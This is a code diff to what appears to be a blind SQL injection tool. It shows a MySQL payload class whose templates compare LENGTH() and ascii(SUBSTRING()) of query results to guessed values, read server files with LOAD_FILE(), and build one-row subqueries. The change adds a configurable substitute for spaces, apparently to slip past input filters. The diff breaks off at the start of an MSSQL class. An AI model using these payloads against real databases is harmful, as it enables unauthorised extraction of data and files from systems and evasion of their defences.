@@ -1,20 +1,21 @@
 class MysqlPayloads:
 
-    def __init__(self, prefix=''):
+    def __init__(self, prefix='', space=' '):
+        self.space = space
         self.prefix = prefix
 
-        self.and_size_eq = self.prefix + " LENGTH({}) = {}"
-        self.and_size_lt = self.prefix + " LENGTH({}) < {}"
-        self.and_size_gt = self.prefix + " LENGTH({}) > {}"
+        self.and_size_eq = self.prefix + space + "LENGTH({})={}"
+        self.and_size_lt = self.prefix + space + "LENGTH({})<{}"
+        self.and_size_gt = self.prefix + space + "LENGTH({})>{}"
 
-        self.and_char_at_is = self.prefix + " ascii(SUBSTRING({}, {},1)) = {}"
-        self.and_char_at_lt = self.prefix + " ascii(SUBSTRING({}, {},1)) < {}"
-        self.and_char_at_gt = self.prefix + " ascii(SUBSTRING({}, {},1)) > {}"
+        self.and_char_at_is = self.prefix + space + "ascii(SUBSTRING({},{},1))={}"
+        self.and_char_at_lt = self.prefix + space + "ascii(SUBSTRING({},{},1))<{}"
+        self.and_char_at_gt = self.prefix + space + "ascii(SUBSTRING({},{},1))>{}"
 
         self.str_file = "(LOAD_FILE({}))"
 
     def one_line_query(self, column, table, where='', offset=0):
-        return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".format(column, table, where, offset)
+        return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)
 
 
 class MssqlPayloads:
